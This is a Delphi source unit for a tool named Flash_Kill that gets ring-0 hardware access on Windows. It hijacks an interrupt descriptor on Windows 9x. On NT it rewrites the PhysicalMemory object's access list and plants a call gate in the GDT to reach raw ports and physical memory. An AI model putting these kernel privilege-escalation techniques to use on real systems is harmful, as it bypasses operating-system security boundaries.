{ OS-dependent parts of Flash_Kill code }

unit SysDep;

interface

var
  PageDirBase: Cardinal;

function MapUnmapPages(map: Boolean; PageIdx, PageCnt: Cardinal): Pointer;
function InPort(IOAddr: Word): byte;
function InPortD(IOAddr: Word): Cardinal;
procedure OutPort(IOAddr: Word; Value: byte);
procedure OutPortD(IOAddr: Word; Value: Cardinal);

implementation

uses SysUtils, Windows, AccCtrl;

type
  TRing0Code = procedure;

{ Windows 9x/Me part }

function W9x_CallOnRing0(Ring0Code: TRing0Code): Cardinal; assembler;
asm
  push ebx
  push eax
  sidt [esp - 2]
  pop ebx
  add ebx, 40
  cli
  mov dx, [ebx + 6]
  shl edx, 16
  mov dx, [ebx]
  mov ecx, offset @@1
  mov [ebx], cx
  shr ecx, 16
  mov [ebx + 6], cx
  push edx
  int 5
  pop edx
  mov [ebx], dx
  shr edx, 16
  mov [ebx + 6], dx
  sti
  jmp @@2
  @@1:
  call eax
  iretd
  @@2:
  pop ebx
end;

function W9x_MapUnmapPages(map: Boolean; PageIdx, PageCnt: Cardinal): Pointer
  stdcall assembler;
asm
  mov eax, offset @@R0_Entry_Point
  call W9x_CallOnRing0
  jecxz @@Exit
  mov PageDirBase, ecx
  jmp @@Exit
@@R0_Entry_Point:
  cmp map, False
  je @@Unmap_Area
  push 8
  push PageCnt
  push $80000400
  int $20
  dd $0001011D
  add esp, 12
  cmp eax, -1
  je @@R0_Return_Failure
  push eax
  push $40060000
  shr eax, 12
  push PageIdx
  push PageCnt
  push eax
  int $20
  dd $00010128
  add esp, 16
  test eax, eax
  pop eax
  jz @@Free_Pages
  mov ecx, cr3
  ret
@@Unmap_Area:
  mov eax, PageIdx
@@Free_Pages:
  push 0
  push eax
  int $20
  dd $00010055
  add esp, 8
@@R0_Return_Failure:
  xor eax, eax
  xor ecx, ecx
  ret
@@Exit:
end;

{ Windows 2000/XP/2003 part }

var
  nt_callgate: array[0..2] of Word;
  IoAllocateMdl: function (VirtualAddress: Pointer; Length: Cardinal;
                           SecondaryBuffer, ChargeQuota: Boolean; Irp: Pointer):
                   Pointer; stdcall;
  IoFreeMdl: procedure (mdl: Pointer); stdcall;
  MmBuildMdlForNonPagedPool: procedure (MemoryDescriptorList: Pointer); stdcall;
  MmMapIoSpace: function (PhysicalAddress: Int64; NumberOfBytes, Cache: Cardinal):
                  Pointer; stdcall;
  MmMapLockedPages: function (MemoryDescriptorList: Pointer; AccessMode:
                      Cardinal): Pointer; stdcall;
  MmUnmapIoSpace: procedure (BaseAddress: Pointer; NumberOfBytes: Cardinal); stdcall;
  MmUnmapLockedPages: procedure (BaseAddress: Pointer; MemoryDescriptorList:
                                 Pointer); stdcall;
  MappedList: array[0..2] of record
    SystemVirtualAddress, Mdl, Address: Pointer;
    SizeOfMemory: Cardinal;
  end;

function NT_MapUnmapPages(map: Boolean; PageIdx, PageCnt: Cardinal): Pointer; stdcall;
begin
  if map then
  asm
    mov  eax, PageIdx
    mov  edx, PageCnt
    mov  cl, 5
    db   $ff, $1d
    dd   offset nt_callgate
    mov  @Result, eax
  end else
  asm
    mov  eax, PageIdx
    mov  cl, 6
    db   $ff, $1d
    dd   offset nt_callgate
    and  @Result, 0
  end;
end;

function NT_InitializeRing0(base: HINST): Boolean;
type
  PPointer = ^Pointer;
  WordArray = array[Word] of Word;
  PCharArray = array[Word] of PChar;
const
  imports: array[0..7] of PChar =
  ('IoAllocateMdl', 'IoFreeMdl', 'MmBuildMdlForNonPagedPool', 'MmMapIoSpace',
   'MmMapLockedPages', 'MmUnmapIoSpace', 'MmUnmapLockedPages', nil);
  impaddrs: array[0..6] of PPointer =
  (@@IoAllocateMdl, @@IoFreeMdl, @@MmBuildMdlForNonPagedPool, @@MmMapIoSpace,
   @@MmMapLockedPages, @@MmUnmapIoSpace, @@MmUnmapLockedPages);
var
  names, Name: ^PChar;
  Address: ^PPointer;
  i: Integer;
  addrs: ^PCharArray;
  indexes: ^WordArray;
begin
  name := @imports[0];
  Address := @impaddrs[0];
  addrs := Ptr(PLongWord(PLongWord(PLongWord(base + $3C)^ + base + $78)^ + base
               + $1C)^ + base);
  names := Ptr(PLongWord(PLongWord(PLongWord(base + $3C)^ + base + $78)^ + base
               + $20)^ + base);
  indexes := Ptr(PLongWord(PLongWord(PLongWord(base + $3C)^ + base + $78)^ + base
                 + $24)^ + base);
  for i := 0 to PInteger(PLongWord(PLongWord(base + $3C)^ + base + $78)^ +
                         base + $18)^ - 1 do
  begin
    if StrIComp(names^ + base, Name^) = 0 then
    begin
      Address^^ := addrs[indexes[i]] + base;
      inc(Address);
      inc(Name);
      if Name^ = nil then
      begin
        Result := True;
        Exit;
      end;
    end;
    inc(names);
  end;
  Result := False;
end;

function NT_MapMemory(PageIdx, PageCnt: Cardinal): Pointer;
var
  SizeOfMemory: Cardinal;
  SystemVirtualAddress, Mdl: Pointer;
  i, n: Integer;
begin
  Result := nil;
  SizeOfMemory := PageCnt * 4096;
  SystemVirtualAddress := MmMapIoSpace(PageIdx * 4096, SizeOfMemory, 0);
  if SystemVirtualAddress = nil then Exit;
  Mdl := IoAllocateMdl(SystemVirtualAddress, SizeOfMemory, False, False, nil);
  if Mdl = nil then
  begin
    MmUnmapIoSpace(SystemVirtualAddress, SizeOfMemory);
    Exit;
  end;
  MmBuildMdlForNonPagedPool(Mdl);
  Result := MmMapLockedPages(Mdl, 1);
  if Result = nil then
  begin
    IoFreeMdl(Mdl);
    MmUnmapIoSpace(SystemVirtualAddress, SizeOfMemory);
  end else
  begin
    Result := Ptr((Cardinal(Result) and $FFFFF000) + PLongWord(PChar(mdl) + 24)^);
    n := 0;
    for i := Low(MappedList) to High(MappedList) do
      if (MappedList[i].SystemVirtualAddress = nil) or (MappedList[i].Mdl = nil)
        or (MappedList[i].SizeOfMemory = 0) or (MappedList[i].Address = nil) then
      begin
        n := i;
        break;
      end;
    MappedList[n].SystemVirtualAddress := SystemVirtualAddress;
    MappedList[n].Mdl := Mdl;
    MappedList[n].SizeOfMemory := SizeOfMemory;
    MappedList[n].Address := Result;
  end;
end;

procedure NT_UnmapMemory(Address: Pointer);
var
  i: Integer;
begin
  for i := Low(MappedList) to High(MappedList) do
    if MappedList[i].Address = Address then
    begin
      asm int 1 end;
      MmUnmapLockedPages(Address, MappedList[i].Mdl);
      IoFreeMdl(MappedList[i].Mdl);
      MmUnmapIoSpace(MappedList[i].SystemVirtualAddress, MappedList[i].SizeOfMemory);
      MappedList[i].SystemVirtualAddress := nil;
      MappedList[i].Mdl := nil;
      MappedList[i].Address := nil;
      MappedList[i].SizeOfMemory := 0;
    end;
end;

procedure nt_r0_ep; assembler;
asm
  push fs
  push $30
  pop  fs
  test cl, cl
  jnz  @@not0
  in   al, dx
  jmp  @@exit
@@not0:
  dec  cl
  jnz  @@not1
  in   eax, dx
  jmp  @@exit
@@not1:
  dec  cl
  jnz  @@not2
  out  dx, al
  jmp  @@exit
@@not2:
  dec  cl
  jnz  @@not3
  out  dx, eax
  jmp  @@exit
@@not3:
  dec  cl
  jnz  @@not4
  push eax
  sidt [esp-2]
  pop  edx
  mov  ax, [edx + 6]
  shl  eax, 16
  mov  ax, [edx]
  and  eax, $FFFFF000
@@find_ntoskrnl:
  sub  eax, 4096
  cmp  word ptr [eax], 'ZM'
  jne  @@find_ntoskrnl
  mov  edx, [eax + $3c]
  add  edx, eax
  cmp  word ptr [edx], 'EP'
  jne  @@find_ntoskrnl
  call NT_InitializeRing0
  jmp  @@exit
@@not4:
  dec  cl
  jnz  @@not5
  call NT_MapMemory
  mov  edx, cr3
  mov  PageDirBase, edx
  jmp  @@exit
@@not5:
  call NT_UnmapMemory
@@exit:
  pop  fs
  retf
end;

function NT_InitializeSysDep: Boolean;
type
  UNICODE_STRING = packed record
    Length: Word;
    MaximumLength: Word;
    Buffer: PWideChar;
  end;
  PUNICODE_STRING = ^UNICODE_STRING;
  OBJECT_ATTRIBUTES = packed record
    Length: Cardinal;
    RootDirectory: THandle;
    ObjectName: PUNICODE_STRING;
    Attributes: Cardinal;
    SecurityDescriptor: Pointer;
    SecurityQualityOfService: Pointer;
  end;
  POBJECT_ATTRIBUTES = ^OBJECT_ATTRIBUTES;
  PPSID = ^PSID;
  PPSECURITY_DESCRIPTOR = ^PSECURITY_DESCRIPTOR;
  GLOBAL_DESCRIPTOR_TABLE = array[0..8191] of packed record
                              offset_0_15, selector, attr, offset_16_31: Word;
                            end;
const
  physMasks: array[Boolean] of Cardinal = ($0FFFF000, $1FFFF000);
var
  NtOpenSection: function (var SectionHandle: THandle; DesiredAccess: ACCESS_MASK;
                           ObjectAttributes: POBJECT_ATTRIBUTES): Integer; stdcall;
  GetSecurityInfo: function (handle: THandle; ObjectType: SE_OBJECT_TYPE;
                             SecurityInfo: SECURITY_INFORMATION; ppsidOwner,
                             ppsidGroup: PPSID; ppDacl, ppSacl: PACL; var
                             ppSecurityDescriptor: PPSECURITY_DESCRIPTOR): DWORD; stdcall;
  SetSecurityInfo: function (handle: THandle; ObjectType: SE_OBJECT_TYPE;
                             SecurityInfo: SECURITY_INFORMATION; ppsidOwner,
                             ppsidGroup: PPSID; ppDacl, ppSacl: PACL): DWORD; stdcall;
  obName: UNICODE_STRING;
  obAttr: OBJECT_ATTRIBUTES;
  pToken: THandle;
  i, gdt_callgate, gdt_code: Cardinal;
  UserInfo: ^SID_AND_ATTRIBUTES;
  origACL, newACL: PACL;
  SecDesc: PPSECURITY_DESCRIPTOR;
  lADVAPI32: HMODULE;
  gdtr: packed record limit: Word; base: Cardinal end;
  gdt: ^GLOBAL_DESCRIPTOR_TABLE;
  section: THandle;
begin
  Result := False;
  NtOpenSection := GetProcAddress(GetModuleHandle('NTDLL'), 'NtOpenSection');
  lADVAPI32 := LoadLibrary('ADVAPI32');
  GetSecurityInfo := GetProcAddress(lADVAPI32, 'GetSecurityInfo');
  SetSecurityInfo := GetProcAddress(lADVAPI32, 'SetSecurityInfo');
  obName.Length := 44;
  obName.MaximumLength := 46;
  obName.Buffer := '\Device\PhysicalMemory';
  obAttr.Length := sizeof(obAttr);
  obAttr.RootDirectory := 0;
  obAttr.ObjectName := @obName;
  obAttr.Attributes := $240;
  obAttr.SecurityDescriptor := nil;
  obAttr.SecurityQualityOfService := nil;
  if NtOpenSection(section, SECTION_MAP_READ or SECTION_MAP_WRITE, @obAttr) <> 0 then
  begin
    if not OpenProcessToken(GetCurrentProcess, TOKEN_QUERY, pToken) then Exit;
    GetTokenInformation(pToken, TokenUser, nil, 0, i);
    GetMem(UserInfo, i);
    if not GetTokenInformation(pToken, TokenUser, UserInfo, i, i) then Exit;
    CloseHandle(pToken);
    if NtOpenSection(section, WRITE_DAC or READ_CONTROL, @obAttr) <> 0 then Exit;
    if GetSecurityInfo(section, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, nil,
                       nil, @origACL, nil, SecDesc) <> 0 then Exit;
    newACL := PACL(LocalAlloc(0, origACL^.AclSize + 12 + GetLengthSid(UserInfo^.Sid)));
    Move(origACL^, newACL^, origACL^.AclSize);
    LocalFree(HLOCAL(SecDesc));
    inc(newACL^.AclSize, 12 + GetLengthSid(UserInfo^.Sid));
    AddAccessAllowedAce(newACL^, 2, SECTION_ALL_ACCESS, UserInfo^.Sid);
    SetSecurityInfo(section, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, nil,
                    nil, newACL, nil);
    FreeMem(UserInfo);
    LocalFree(HLOCAL(newACL));
    CloseHandle(section);
    if NtOpenSection(section, SECTION_MAP_READ or SECTION_MAP_WRITE, @obAttr) <> 0 then Exit;
  end;
  if not VirtualLock(@nt_r0_ep, Cardinal(@NT_InitializeSysDep) - Cardinal(@nt_r0_ep)) then Exit;
  asm sgdt [gdtr] end;
  gdt := MapViewOfFile(section, FILE_MAP_READ or FILE_MAP_WRITE, 0,
                       gdtr.base and physMasks[(gdtr.base < $80000000) or
                       (gdtr.base > $A0000000)], (gdtr.limit + 4095) and $FFFFF000);
  if gdt = nil then Exit;
  gdt_callgate := 0;
  gdt_code := 0;
  for i := gdtr.limit div 8 downto 10 do
    if gdt^[i].attr and $f000 = 0 then
      if gdt_callgate = 0 then
        gdt_callgate := i
      else begin
        gdt_code := i;
        break;
      end;
  if gdt_code = 0 then Exit;
  PInteger(@gdt^[gdt_code])^ := PInteger(@gdt^[1])^;
  PInteger(PChar(@gdt^[gdt_code]) + 4)^ := PInteger(PChar(@gdt^[1]) + 4)^;
  gdt^[gdt_callgate].offset_0_15 := Cardinal(@nt_r0_ep);
  gdt^[gdt_callgate].selector := gdt_code*8;
  gdt^[gdt_callgate].attr := $ec00;
  gdt^[gdt_callgate].offset_16_31 := Cardinal(@nt_r0_ep) shr 16;
  UnmapViewOfFile(gdt);
  CloseHandle(section);
  nt_callgate[2] := gdt_callgate*8 + 3;
  asm
    mov  cl, 4
    db   $ff, $1d
    dd   offset nt_callgate
    mov  @Result, al
  end;
end;

function MapUnmapPages;
begin
  if Win32Platform = VER_PLATFORM_WIN32_NT then
    Result := NT_MapUnmapPages(map, PageIdx, PageCnt)
  else
    Result := W9x_MapUnmapPages(map, PageIdx, PageCnt);
end;

function InPort(IOAddr: Word): byte assembler;
asm
  xchg eax, edx
  cmp  Win32Platform, VER_PLATFORM_WIN32_NT
  je   @@winNT
  in   al, dx
  jmp  @@exit
@@winNT:
  mov  cl, 0
  db   $ff, $1d
  dd   offset nt_callgate
@@exit:
end;

function InPortD(IOAddr: Word): Cardinal assembler;
asm
  xchg eax, edx
  cmp  Win32Platform, VER_PLATFORM_WIN32_NT
  je   @@winNT
  in   eax, dx
  jmp  @@exit
@@winNT:
  mov  cl, 1
  db   $ff, $1d
  dd   offset nt_callgate
@@exit:
end;

procedure OutPort(IOAddr: Word; Value: byte) assembler;
asm
  xchg eax, edx
  cmp  Win32Platform, VER_PLATFORM_WIN32_NT
  je   @@winNT
  out  dx, al
  jmp  @@exit
@@winNT:
  mov  cl, 2
  db   $ff, $1d
  dd   offset nt_callgate
@@exit:
end;

procedure OutPortD(IOAddr: Word; Value: Cardinal) assembler;
asm
  xchg eax, edx
  cmp  Win32Platform, VER_PLATFORM_WIN32_NT
  je   @@winNT
  out  dx, eax
  jmp  @@exit
@@winNT:
  mov  cl, 3
  db   $ff, $1d
  dd   offset nt_callgate
@@exit:
end;

initialization
  if Win32Platform = VER_PLATFORM_WIN32_NT then
    if not NT_InitializeSysDep then Halt;
end.
